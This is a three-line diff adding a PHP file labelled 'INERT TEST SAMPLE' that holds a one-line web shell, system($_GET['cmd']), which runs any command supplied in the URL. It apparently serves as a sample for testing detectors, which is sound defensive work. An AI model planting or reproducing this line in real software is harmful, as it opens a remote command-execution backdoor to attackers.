@@ -1,0 +1,3 @@
+// INERT TEST SAMPLE
+system($_GET['cmd']);
+
